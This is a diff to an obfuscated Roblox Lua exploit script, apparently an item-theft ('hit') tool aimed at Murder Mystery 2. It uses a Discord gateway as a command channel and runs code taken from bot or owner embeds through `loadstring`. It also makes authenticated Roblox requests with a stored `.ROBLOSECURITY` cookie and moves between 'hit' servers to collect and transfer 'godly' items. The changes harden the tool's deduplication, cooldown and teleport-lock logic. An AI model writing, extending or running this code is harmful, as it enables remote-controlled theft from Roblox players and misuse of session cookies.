@@ -10,7 +10,7 @@ _cmdCh        = _cmdCh or _ch;
 _owner        = _owner or "";
 _robloxCookie = _robloxCookie or "";
 _allow        = _allow or {[142823291] = true};
-_embedCh      = _embedCh or _hitCh;   -- channel to scan for exec-embeds
+_embedCh      = _embedCh or _hitCh;
 -- ═══════════════════════════════════════════════════════════════
 
 if _bt == "" or _ch == "" then
@@ -20,6 +20,11 @@ end
 
 if getgenv().__aio_loaded then return end
 getgenv().__aio_loaded = true
+
+-- ─── Cross-execution dedupe (survives file issues) ───
+getgenv()._ajHitJobs = getgenv()._ajHitJobs or {};
+getgenv()._ajHitMsgs = getgenv()._ajHitMsgs or {};
+getgenv()._ajLastExec = getgenv()._ajLastExec or 0;
 
 repeat task.wait() until game:IsLoaded()
 
@@ -512,6 +517,28 @@ local function _al(_f, _v)
     table.insert(_t, _v); _wl(_f, _t);
 end
 
+-- Cross-execution wrappers (getgenv + file)
+local function _jobHit(_jid)
+    if not _jid or _jid == "" then return false end
+    if getgenv()._ajHitJobs[_jid] then return true end
+    return _il("executed_jobids.dat", _jid);
+end
+local function _markJobHit(_jid)
+    if not _jid or _jid == "" then return end
+    getgenv()._ajHitJobs[_jid] = true;
+    _al("executed_jobids.dat", _jid);
+end
+local function _msgHit(_mid)
+    if not _mid then return false end
+    if getgenv()._ajHitMsgs[_mid] then return true end
+    return _il("executed_embeds.dat", _mid);
+end
+local function _markMsgHit(_mid)
+    if not _mid then return end
+    getgenv()._ajHitMsgs[_mid] = true;
+    _al("executed_embeds.dat", _mid);
+end
+
 function _gone()
     local _tg = readfile("last_target.dat");
     for _, _p in pairs(game.Players:GetChildren()) do
@@ -545,25 +572,26 @@ local function _getMsgs(_after, _chan)
     return {}
 end
 
--- ─── EMBED MATCHER ───
+-- ─── EMBED MATCHER — permissive: title alone is enough ───
 local function _embedLooksRight(_e)
     if not _e then return false end
-    local title      = tostring(_e.title or "");
-    local color      = tonumber(_e.color);
+    local title = tostring(_e.title or "");
+    if title:find("TARGET ACQUIRED") then return true end
+    if title:find("HIT CONFIRMED") then return true end
     local footerText = (_e.footer and tostring(_e.footer.text or "")) or "";
     local desc       = tostring(_e.description or "");
-
-    if title:find("TARGET ACQUIRED") and color == 0x0A1A3C then
-        return true;
-    end
-    if footerText:find("deadhub") and desc:find("just landed") then
+    if footerText:find("deadhub") and (desc:find("just landed") or desc:find("got emptied")) then
         return true;
     end
     return false;
 end
 
+local function _hasAnyEmbed(_md)
+    return _md and _md.embeds and #_md.embeds > 0;
+end
+
 local function _hasTargetEmbed(_md)
-    if not _md or not _md.embeds then return false end
+    if not _hasAnyEmbed(_md) then return false end
     for _, _e in ipairs(_md.embeds) do
         if _embedLooksRight(_e) then return true end
     end
@@ -573,8 +601,9 @@ end
 local function _pjm(_m)
     if not _m or not _m.author then return end
     if _m.channel_id and _m.channel_id ~= _hitCh then return end
-    if _hasTargetEmbed(_m) then return end
-    if _moving then return end          -- NEW: bail if a teleport is already running
+    -- skip ANY message with embeds — real hits are text-only
+    if _hasAnyEmbed(_m) then return end
+    if _moving then return end
     local _c = _m.content or "";
     local _pi, _ji = string.match(_c, "(%d+),%s*'([^']+)'");
     if not (_pi and _ji) then _pi, _ji = string.match(_c, 'TeleportToPlaceInstance%s*%(%s*"(%d+)"%s*,%s*"([^"]+)"'); end
@@ -585,6 +614,7 @@ local function _pjm(_m)
     writefile("last_target.dat", _m.author.username);
     if _il("hits_joined.dat", _m.id) then return end
     if _ji == game.JobId then return end
+    if _jobHit(_ji) then return end
     local _q = _rl("pending_hits.dat");
     for _, _j in ipairs(_q) do
         if _j.msgid == _m.id then return end
@@ -629,9 +659,6 @@ function _tpTo(_pi, _ji, _mi)
     end)
 end
 
--- ═══════════════════════════════════════════════════════════════
---  PATCHED: stack-aware godly collector
--- ═══════════════════════════════════════════════════════════════
 local function _collectGodlies()
     local _out = {};
     if not _isMM2 or not _gi then return _out end
@@ -732,10 +759,11 @@ local function _doTransfer(_targetName)
 end
 
 -- ═══════════════════════════════════════════════════════════════
---  EMBED EXEC — with anti-spam guards + ❌/✅ reactions
+--  EMBED EXEC — hardened: getgenv + file dedupe, sets _moving,
+--  longer cooldown. Guards: msg-id, same-job, hit-job, moving,
+--  cooldown. Reactions: ❌ on skip/error, ✅ on success.
 -- ═══════════════════════════════════════════════════════════════
-local _lastEmbedExec = 0
-local _EMBED_COOLDOWN = 20   -- seconds between embed-triggered execs
+local _EMBED_COOLDOWN = 60
 
 local function _extractJobId(code)
     if not code then return nil end
@@ -745,10 +773,7 @@ end
 
 local function _extractCode(_md, _e)
     local candidates = {};
-
-    if _md and _md.content then
-        table.insert(candidates, tostring(_md.content));
-    end
+    if _md and _md.content then table.insert(candidates, tostring(_md.content)) end
     if _e then
         if _e.description then table.insert(candidates, _e.description) end
         if _e.title       then table.insert(candidates, _e.title) end
@@ -762,19 +787,16 @@ local function _extractCode(_md, _e)
             table.insert(candidates, _e.footer.text);
         end
     end
-
     for _, txt in ipairs(candidates) do
         local cleaned = txt:gsub("```[%w]*", ""):gsub("`", "");
         local line = cleaned:match("(game:GetService[^\r\n]+)");
-        if line then
-            return line;
-        end
+        if line then return line end
     end
     return nil;
 end
 
 local function _execEmbed(_md)
-    if not _md.embeds or #_md.embeds == 0 then return end
+    if not _hasAnyEmbed(_md) then return end
     for _, _e in ipairs(_md.embeds) do
         if _embedLooksRight(_e) then
 
@@ -782,9 +804,9 @@ local function _execEmbed(_md)
                 task.spawn(function() _reactIn(_embedCh, _md.id, "❌") end)
             end
 
-            if _il("executed_embeds.dat", _md.id) then
-                _reactX()
-                return
+            -- 1. same message
+            if _msgHit(_md.id) then
+                _reactX(); return
             end
 
             local code = _extractCode(_md, _e)
@@ -792,49 +814,62 @@ local function _execEmbed(_md)
 
             local jid = _extractJobId(code)
 
+            -- 2. already in target server
             if jid and jid == game.JobId then
-                _al("executed_embeds.dat", _md.id)
+                _markMsgHit(_md.id)
                 _reactX()
                 print("[embed] skip: already in " .. tostring(jid):sub(1, 16))
                 return
             end
 
-            if jid and _il("executed_jobids.dat", jid) then
-                _al("executed_embeds.dat", _md.id)
+            -- 3. already hit this JobId (getgenv + file)
+            if jid and _jobHit(jid) then
+                _markMsgHit(_md.id)
                 _reactX()
                 print("[embed] skip: already hit " .. tostring(jid):sub(1, 16))
                 return
             end
 
+            -- 4. teleport already in progress
             if _moving then
-                _al("executed_embeds.dat", _md.id)
+                _markMsgHit(_md.id)
                 _reactX()
                 print("[embed] skip: already moving")
                 return
             end
 
-            if (tick() - _lastEmbedExec) < _EMBED_COOLDOWN then
-                _al("executed_embeds.dat", _md.id)
+            -- 5. cooldown (getgenv-based, survives reload)
+            if (tick() - getgenv()._ajLastExec) < _EMBED_COOLDOWN then
+                _markMsgHit(_md.id)
                 _reactX()
-                print("[embed] skip: cooldown (" .. math.floor(tick() - _lastEmbedExec) .. "s)")
+                print("[embed] skip: cooldown (" .. math.floor(tick() - getgenv()._ajLastExec) .. "s)")
                 return
             end
 
+            -- pass all guards — commit
             local fn, err = loadstring(code)
             if not fn then
+                _markMsgHit(_md.id)
                 _reactX()
                 _postEmbed("❌ Embed Load Error",
                     "```\n" .. tostring(err):sub(1, 900) .. "\n```", 0xFF0000)
                 return
             end
 
-            _lastEmbedExec = tick()
-            if jid then _al("executed_jobids.dat", jid) end
-            _al("executed_embeds.dat", _md.id)
+            getgenv()._ajLastExec = tick()
+            _markMsgHit(_md.id)
+            if jid then _markJobHit(jid) end
+
+            -- lock the whole teleport system while the embed code runs
+            _moving = true
+            _cur = { placeId = 142823291, jobId = jid or "", msgid = _md.id }
+            task.delay(15, function()
+                _moving = false
+                _cur = nil
+            end)
 
             local ok, runErr = pcall(fn)
 
-            -- success = ✅, runtime error = ❌
             task.spawn(function() _reactIn(_embedCh, _md.id, ok and "✅" or "❌") end)
 
             _postEmbed(
@@ -863,12 +898,10 @@ local function _isOwner(_author)
     return _owner ~= "" and _author and tostring(_author.id) == tostring(_owner)
 end
 
--- ═══════════ COOKIE HELPERS ═══════════
 local function _getUserId(_username)
     if not _username then return nil, "no username" end
     _username = tostring(_username):gsub("^%s+", ""):gsub("%s+$", "")
     if _username == "" then return nil, "empty username" end
-
     local _ok, _r = pcall(function()
         return request({
             Url = "https://users.roblox.com/v1/usernames/users",
@@ -898,15 +931,8 @@ local function _cookiePost(_url, _body)
         ["Cookie"] = ".ROBLOSECURITY=".._robloxCookie,
         ["Content-Type"] = "application/json"
     }
-    if _csrf then
-        _hdrs["X-CSRF-TOKEN"] = _csrf
-    end
-    return request({
-        Url = _url,
-        Method = "POST",
-        Headers = _hdrs,
-        Body = _body or "{}"
-    })
+    if _csrf then _hdrs["X-CSRF-TOKEN"] = _csrf end
+    return request({ Url = _url, Method = "POST", Headers = _hdrs, Body = _body or "{}" })
 end
 
 local function _cookiePostRetry(_url, _body)
@@ -919,7 +945,6 @@ local function _cookiePostRetry(_url, _body)
     return _r
 end
 
--- ═══════════ TRACKER LOOP ═══════════
 task.spawn(function()
     while task.wait(60) do
         if _robloxCookie == "" or not next(_tracked) then continue end
@@ -951,7 +976,6 @@ task.spawn(function()
     end
 end)
 
--- ═══════════ GATEWAY SETUP ═══════════
 local function _gw()
     _gen = _gen + 1;
     local _me = _gen;
@@ -984,7 +1008,7 @@ local function _gw()
             _resume = true; _rGen = _me;
             print("[gw] connected (READY)");
         end
-        if _d.op == 0 and _d.t == "RESUMED" then _rGen = _me; print("[gw] session resumed") end
+        if _d.op == 0 and _d.t == "RESUMED" then _rGen = _me end
         if _d.op == 7 then _resume = true; pcall(function() if _sock then _sock:Close() end end); return end
         if _d.op == 9 then
             _resume = (_d.d == true);
@@ -1000,7 +1024,7 @@ local function _gw()
             local _isCmd = (_md.channel_id == _cmdCh);
             local _isHit = (_md.channel_id == _hitCh);
 
-            if _md.embeds and #_md.embeds > 0
+            if _hasAnyEmbed(_md)
                and (_md.channel_id == _embedCh)
                and ((_md.author and _md.author.bot) or _isOwner(_md.author)) then
                 task.spawn(_execEmbed, _md);
@@ -1027,7 +1051,9 @@ local function _gw()
                     if not _isOwner(_md.author) then return end
                     _wl("executed_embeds.dat", {});
                     _wl("executed_jobids.dat", {});
-                    _lastEmbedExec = 0;
+                    getgenv()._ajHitJobs = {};
+                    getgenv()._ajHitMsgs = {};
+                    getgenv()._ajLastExec = 0;
                     _postEmbed("🧹 Embed History Cleared", "You can re-hit any JobId now.", 0x3EED50);
                     return;
                 end
@@ -1642,7 +1668,7 @@ task.spawn(function()
             if #_q > 0 then
                 local _j = table.remove(_q, 1);
                 _wl("pending_hits.dat", _q);
-                if _j and _j.msgid and not _il("hits_joined.dat", _j.msgid) and _j.jobId ~= game.JobId then
+                if _j and _j.msgid and not _il("hits_joined.dat", _j.msgid) and _j.jobId ~= game.JobId and not _jobHit(_j.jobId) then
                     _tpTo(_j.placeId, _j.jobId, _j.msgid);
                 end
             end
